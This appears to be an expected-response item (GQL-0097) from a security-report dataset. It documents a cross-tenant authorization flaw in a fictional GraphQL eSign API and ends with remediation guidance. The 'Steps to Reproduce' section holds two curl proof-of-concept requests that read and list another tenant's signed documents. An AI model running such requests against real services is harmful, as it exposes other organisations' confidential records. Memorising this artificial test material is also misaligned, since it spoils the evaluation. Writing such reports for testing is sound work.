# Expected Response

## System
- Domain: Document Signing / eSign
- System: SignFlow eSign Platform
- Example ID: GQL-0097

## Priority Findings

### Finding 1: Cross-Service Identity Drift — eSignature Document Access Across Service Boundary (Pattern 1.10)
**Severity:** Critical
**Category:** BOLA / Cross-Service Identity Drift

**Summary:**
Per §5.0 (Pattern 1.10 — cross-service identity propagation drift): The downstream GraphQL resolver trusts a forwarded or client-supplied identity rather than re-validating the JWT-bound tenantId. An attacker from `tenant-e074` accessed signed document record `R-2097` belonging to `tenant-fbad`. In an eSignature platform, this exposes legally binding documents, signature audit trails, and signatory PII — with implications for contract validity and legal liability.

**Evidence from HAR:**
- Request: `POST https://api.signflow-esign-pl.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-e074`
- Query: `getResource(id: "R-2097") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `tenantId: "tenant-fbad"`, `ownerId: "other-user-e074fbad"`, `sensitiveField: "CONFIDENTIAL-e074fbad"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-e074fbad`

## Steps to Reproduce

### Step 1 — Cross-service document access (HAR)
```bash
curl -s -X POST https://api.signflow-esign-pl.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-e074" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2097\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-e074fbad` signed document from `tenant-fbad`. **Secure:** FORBIDDEN.

### Step 2 — Enumerate documents via listResources
```bash
curl -s -X POST https://api.signflow-esign-pl.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-e074" \
  -d '{"query": "query { listResources(tenantId: \"tenant-fbad\") { resourceId tenantId data { sensitiveField } } }"}'
```

## Remediation
1. Each service must re-validate JWT and extract tenantId independently.
2. Never forward client-supplied identity across service boundaries.
3. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
